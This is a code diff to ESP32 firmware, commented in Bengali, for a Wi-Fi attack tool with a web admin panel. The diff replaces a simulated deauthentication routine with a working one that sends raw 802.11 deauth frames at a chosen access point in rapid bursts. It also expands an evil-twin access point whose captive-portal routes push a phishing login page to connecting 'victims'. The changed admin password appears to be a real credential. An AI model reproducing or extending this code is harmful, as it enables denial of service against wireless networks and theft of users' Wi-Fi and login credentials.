@@ -9,8 +9,8 @@ WebServer adminServer(80);
 WebServer phishingServer(8080);
 
 // ========== Admin AP সেটিংস ==========
-const char* adminSSID = "CyberTrainer-AP";
-const char* adminPASS = "trainer123";
+const char* adminSSID = "Unknown";
+const char* adminPASS = "R@bbi0606@";
 
 // ========== গ্লোবাল ভেরিয়েবল ==========
 String targetSSID = "";
@@ -24,6 +24,17 @@ String evilTwinPASS = "connect123";
 // ========== Deauth স্ট্যাটস ==========
 unsigned long deauthStartTime = 0;
 int deauthPacketsSent = 0;
+
+// Deauth Packet Template
+uint8_t deauthPacket[26] = {
+    0xC0, 0x00,                         // Type/Subtype: Deauthentication
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be set)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be set)
+    0x00, 0x00,                         // Fragment & Sequence number
+    0x07, 0x00                          // Reason code: Class 3 frame received
+};
 
 // ========== নেটওয়ার্ক স্ক্যান ==========
 String networkSSIDs[50];
@@ -263,6 +274,85 @@ const char* adminDashboard = R"rawliteral(
             border-radius: 8px;
             font-size: 16px;
         }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .scanning-text {
+            text-align: center;
+            color: var(--primary);
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .network-item.selected {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            border-left: 4px solid #fff;
+        }
+        
+        .signal-strength {
+            display: inline-block;
+            margin-left: 10px;
+        }
+        
+        .signal-bar {
+            display: inline-block;
+            width: 3px;
+            height: 12px;
+            background: #ddd;
+            margin: 0 1px;
+            border-radius: 2px;
+        }
+        
+        .signal-bar.active {
+            background: #28a745;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+            
+            .btn {
+                padding: 10px 15px;
+                font-size: 14px;
+                margin: 3px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .stats {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .stat-value {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -275,8 +365,8 @@ const char* adminDashboard = R"rawliteral(
         <div class="dashboard">
             <div class="card">
                 <h2>📶 Wi-Fi Network Scanner</h2>
-                <button class="btn btn-primary" onclick="scanNetworks()">
-                    Scan Networks
+                <button class="btn btn-primary" id="scanBtn" onclick="scanNetworks()">
+                    🔍 Scan Networks
                 </button>
                 <div class="network-list" id="networkList">
                     <!-- Networks will appear here -->
@@ -359,28 +449,66 @@ const char* adminDashboard = R"rawliteral(
         let selectedNetwork = null;
         
         function scanNetworks() {
+            let list = document.getElementById('networkList');
+            let scanBtn = document.getElementById('scanBtn');
+            
+            // লোডার দেখান
+            list.innerHTML = '<div class="loader"></div><div class="scanning-text">🔍 Scanning networks...</div>';
+            scanBtn.disabled = true;
+            scanBtn.textContent = '⏳ Scanning...';
+            
             fetch('/scan')
                 .then(r => r.json())
                 .then(data => {
-                    let list = document.getElementById('networkList');
                     list.innerHTML = '';
                     
-                    data.networks.forEach((net, idx) => {
-                        let div = document.createElement('div');
-                        div.className = 'network-item';
-                        div.innerHTML = `
-                            <strong>${net.ssid || 'Hidden'}</strong><br>
-                            <small>Channel: ${net.channel} | RSSI: ${net.rssi}</small>
-                        `;
-                        div.onclick = () => selectNetwork(net);
-                        list.appendChild(div);
-                    });
+                    if(data.networks.length === 0) {
+                        list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">No networks found</div>';
+                    } else {
+                        data.networks.forEach((net, idx) => {
+                            let div = document.createElement('div');
+                            div.className = 'network-item';
+                            div.setAttribute('data-bssid', net.bssid);
+                            
+                            // Signal strength indicator
+                            let strength = Math.min(4, Math.max(0, Math.floor((net.rssi + 100) / 12.5)));
+                            let bars = '';
+                            for(let i = 0; i < 4; i++) {
+                                bars += `<span class="signal-bar ${i < strength ? 'active' : ''}"></span>`;
+                            }
+                            
+                            div.innerHTML = `
+                                <strong>${net.ssid || 'Hidden Network'}</strong>
+                                <span class="signal-strength">${bars}</span><br>
+                                <small>📡 Ch: ${net.channel} | 📶 ${net.rssi} dBm | 🔐 ${net.bssid}</small>
+                            `;
+                            div.onclick = () => selectNetwork(net, div);
+                            list.appendChild(div);
+                        });
+                    }
+                    
+                    scanBtn.disabled = false;
+                    scanBtn.textContent = '🔍 Scan Networks';
+                })
+                .catch(err => {
+                    list.innerHTML = '<div style="text-align:center;padding:20px;color:red;">❌ Scan failed</div>';
+                    scanBtn.disabled = false;
+                    scanBtn.textContent = '🔍 Scan Networks';
                 });
         }
         
-        function selectNetwork(network) {
+        function selectNetwork(network, element) {
             selectedNetwork = network;
-            document.getElementById('targetNetwork').value = network.ssid || 'Hidden';
+            
+            // Remove previous selection
+            document.querySelectorAll('.network-item').forEach(item => {
+                item.classList.remove('selected');
+            });
+            
+            // Add selection to clicked item
+            if(element) element.classList.add('selected');
+            
+            document.getElementById('targetNetwork').value = network.ssid || 'Hidden Network';
             document.getElementById('btnDeauth').disabled = false;
             document.getElementById('btnEvilTwin').disabled = false;
         }
@@ -388,7 +516,7 @@ const char* adminDashboard = R"rawliteral(
         function startDeauth() {
             if(!selectedNetwork) return alert('Select a network first');
             
-            fetch(`/startDeauth?ssid=${encodeURIComponent(selectedNetwork.ssid)}&channel=${selectedNetwork.channel}`)
+            fetch(`/startDeauth?ssid=${encodeURIComponent(selectedNetwork.ssid)}&bssid=${encodeURIComponent(selectedNetwork.bssid)}&channel=${selectedNetwork.channel}`)
                 .then(r => r.json())
                 .then(data => {
                     if(data.success) {
@@ -398,11 +526,12 @@ const char* adminDashboard = R"rawliteral(
                         
                         let status = document.getElementById('attackStatus');
                         status.innerHTML = `
-                            <div style="background:#ffebee; padding:15px; border-radius:10px; border-left:5px solid var(--danger);">
-                                <strong>Deauth Attack Active!</strong><br>
+                            <div style="background:#ffebee; padding:15px; border-radius:10px; border-left:5px solid var(--danger); animation:pulse 2s infinite;">
+                                <strong>💥 Deauth Attack Active!</strong><br>
                                 Target: ${selectedNetwork.ssid}<br>
+                                BSSID: ${selectedNetwork.bssid}<br>
                                 <button class="btn btn-danger" onclick="stopDeauth()" style="margin-top:10px;">
-                                    Stop Deauth
+                                    ⏹️ Stop Deauth
                                 </button>
                             </div>
                         `;
@@ -428,11 +557,15 @@ const char* adminDashboard = R"rawliteral(
                         let status = document.getElementById('attackStatus');
                         status.innerHTML = `
                             <div style="background:#fff3cd; padding:15px; border-radius:10px; border-left:5px solid var(--warning);">
-                                <strong>Evil Twin Created!</strong><br>
+                                <strong>👥 Evil Twin Created!</strong><br>
                                 SSID: ${selectedNetwork.ssid}<br>
                                 Password: ${password}<br>
+                                <small style="color:#856404; display:block; margin-top:10px;">
+                                    ℹ️ Admin Access: <a href="http://192.168.4.1/admin" target="_blank" style="color:#667eea;">192.168.4.1/admin</a><br>
+                                    Victims will see login page on: <code>192.168.4.1</code>
+                                </small>
                                 <button class="btn btn-warning" onclick="stopEvilTwin()" style="margin-top:10px;">
-                                    Stop Evil Twin
+                                    ⏹️ Stop Evil Twin
                                 </button>
                             </div>
                         `;
@@ -688,14 +821,15 @@ const char* phishingPage = R"rawliteral(
 void scanNetworks() {
     Serial.println("\n[SCAN] Starting Wi-Fi scan...");
     
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    delay(100);
+    // AP mode চালু রেখেই স্ক্যান করুন
+    WiFi.mode(WIFI_AP_STA);
+    delay(50);
     
-    int n = WiFi.scanNetworks(false, true);
+    // দ্রুত স্ক্যান - শুধু active scan, 200ms timeout
+    int n = WiFi.scanNetworks(false, false, false, 200);
     networkCount = min(n, 50);
     
-    Serial.printf("[SCAN] Found %d networks:\n", networkCount);
+    Serial.printf("[SCAN] Found %d networks in fast mode\n", networkCount);
     
     for(int i = 0; i < networkCount; i++) {
         networkSSIDs[i] = WiFi.SSID(i);
@@ -711,19 +845,21 @@ void scanNetworks() {
                      networkRSSI[i]);
     }
     
-    WiFi.mode(WIFI_AP_STA);
+    // স্ক্যান ডেটা পরিষ্কার করুন
+    WiFi.scanDelete();
 }
 
 // Evil Twin AP তৈরি
 void createEvilTwinAP(String ssid, String password, int channel) {
     Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
     
-    // আগের AP বন্ধ করুন
-    WiFi.softAPdisconnect(true);
+    // আগের AP বন্ধ করবেন না - Admin connection রাখার জন্য
+    // শুধু SSID পরিবর্তন করুন (Admin এখনও IP দিয়ে access করতে পারবে)
+    WiFi.softAPdisconnect(false); // false = disconnect clients but keep AP
     delay(100);
     
-    // Evil Twin AP তৈরি করুন
-    bool success = WiFi.softAP(ssid.c_str(), password.c_str(), channel, 0, 4);
+    // Evil Twin AP তৈরি করুন (একই IP range)
+    bool success = WiFi.softAP(ssid.c_str(), password.c_str(), channel, 0, 8);
     
     if(success) {
         isEvilTwinActive = true;
@@ -735,9 +871,26 @@ void createEvilTwinAP(String ssid, String password, int channel) {
         Serial.printf("  Password: %s\n", password.c_str());
         Serial.printf("  Channel: %d\n", channel);
         Serial.printf("  IP Address: %s\n", WiFi.softAPIP().toString().c_str());
+        Serial.println("\n  📱 For Victims: http://192.168.4.1");
+        Serial.println("  🔐 For Admin: http://192.168.4.1/admin");
         
-        // Evil Twin সার্ভার সেটআপ
+        // Evil Twin সার্ভার সেটআপ (Captive Portal)
         phishingServer.on("/", HTTP_GET, []() {
+            // Check if accessing admin panel
+            String host = phishingServer.header("Host");
+            if(host.indexOf("admin") >= 0 || phishingServer.hasArg("admin")) {
+                phishingServer.send(200, "text/html", adminDashboard);
+            } else {
+                phishingServer.send(200, "text/html", phishingPage);
+            }
+        });
+        
+        // Captive portal detection (for Android/iOS)
+        phishingServer.on("/generate_204", HTTP_GET, []() {
+            phishingServer.send(200, "text/html", phishingPage);
+        });
+        
+        phishingServer.on("/hotspot-detect.html", HTTP_GET, []() {
             phishingServer.send(200, "text/html", phishingPage);
         });
         
@@ -779,13 +932,38 @@ void createEvilTwinAP(String ssid, String password, int channel) {
     }
 }
 
-// Deauth সিমুলেশন
+// Real Deauth Attack Function
+void sendDeauthPacket() {
+    if(!isDeauthActive || targetBSSID.length() < 17) return;
+    
+    // Parse BSSID string to bytes
+    uint8_t bssid[6];
+    sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    
+    // Set BSSID in deauth packet (source and BSSID fields)
+    memcpy(&deauthPacket[10], bssid, 6);
+    memcpy(&deauthPacket[16], bssid, 6);
+    
+    // Send deauth packet
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    
+    deauthPacketsSent++;
+    
+    if(deauthPacketsSent % 50 == 0) {
+        Serial.printf("[DEAUTH] 💥 Sent %d packets to %s [%s]\n", 
+                     deauthPacketsSent, targetSSID.c_str(), targetBSSID.c_str());
+    }
+}
+
+// Deauth Attack Loop
 void simulateDeauthAttack() {
     if(isDeauthActive) {
-        deauthPacketsSent++;
-        
-        Serial.printf("[DEAUTH] Packet #%d sent to %s\n", 
-                     deauthPacketsSent, targetSSID.c_str());
+        // Send multiple packets for better effectiveness
+        for(int i = 0; i < 5; i++) {
+            sendDeauthPacket();
+            delay(1);
+        }
     }
 }
 
@@ -794,6 +972,23 @@ void simulateDeauthAttack() {
 void setupAdminServer() {
     // মূল ড্যাশবোর্ড
     adminServer.on("/", HTTP_GET, []() {
+        // যদি Evil Twin active থাকে, তাহলে admin check করুন
+        if(isEvilTwinActive) {
+            String userAgent = adminServer.header("User-Agent");
+            // Admin panel শুধু specific user-agent/query parameter দিয়ে access
+            if(adminServer.hasArg("admin") || adminServer.uri() == "/admin") {
+                adminServer.send(200, "text/html", adminDashboard);
+            } else {
+                // Victim দেখাবে phishing page
+                adminServer.send(200, "text/html", phishingPage);
+            }
+        } else {
+            adminServer.send(200, "text/html", adminDashboard);
+        }
+    });
+    
+    // Admin panel dedicated route
+    adminServer.on("/admin", HTTP_GET, []() {
         adminServer.send(200, "text/html", adminDashboard);
     });
     
@@ -819,7 +1014,12 @@ void setupAdminServer() {
     // Deauth শুরু
     adminServer.on("/startDeauth", HTTP_GET, []() {
         targetSSID = adminServer.arg("ssid");
+        targetBSSID = adminServer.arg("bssid");
         targetChannel = adminServer.arg("channel").toInt();
+        
+        // Set WiFi channel for deauth
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
         
         isDeauthActive = true;
         deauthStartTime = millis();
@@ -828,15 +1028,18 @@ void setupAdminServer() {
         String response = "{\"success\":true,\"message\":\"Deauth started\"}";
         adminServer.send(200, "application/json", response);
         
-        Serial.printf("\n[DEAUTH] Attack started on: %s (Channel: %d)\n", 
-                     targetSSID.c_str(), targetChannel);
+        Serial.printf("\n[DEAUTH] 💥 Attack started!\n");
+        Serial.printf("  Target: %s\n", targetSSID.c_str());
+        Serial.printf("  BSSID: %s\n", targetBSSID.c_str());
+        Serial.printf("  Channel: %d\n", targetChannel);
     });
     
     // Deauth বন্ধ
     adminServer.on("/stopDeauth", HTTP_GET, []() {
         isDeauthActive = false;
+        esp_wifi_set_promiscuous(false);
         adminServer.send(200, "application/json", "{\"success\":true}");
-        Serial.println("\n[DEAUTH] Attack stopped");
+        Serial.printf("\n[DEAUTH] Attack stopped. Total packets sent: %d\n", deauthPacketsSent);
     });
     
     // Evil Twin তৈরি
@@ -853,11 +1056,16 @@ void setupAdminServer() {
     
     // Evil Twin বন্ধ
     adminServer.on("/stopEvilTwin", HTTP_GET, []() {
-        WiFi.softAPdisconnect(true);
+        // Evil Twin বন্ধ করে Admin AP restore করুন
+        WiFi.softAPdisconnect(false);
+        delay(100);
         isEvilTwinActive = false;
         
         // Admin AP আবার চালু করুন
         WiFi.softAP(adminSSID, adminPASS);
+        
+        // Phishing server বন্ধ করুন
+        phishingServer.stop();
         
         adminServer.send(200, "application/json", "{\"success\":true}");
         Serial.println("\n[EVIL TWIN] Stopped, Admin AP restored");
@@ -961,9 +1169,9 @@ void loop() {
         phishingServer.handleClient();
     }
     
-    // Deauth অ্যাটাক সিমুলেশন
+    // Deauth অ্যাটাক (প্রতি 10ms এ 5টি packet)
     static unsigned long lastDeauth = 0;
-    if(isDeauthActive && millis() - lastDeauth > 100) {
+    if(isDeauthActive && millis() - lastDeauth > 10) {
         simulateDeauthAttack();
         lastDeauth = millis();
     }
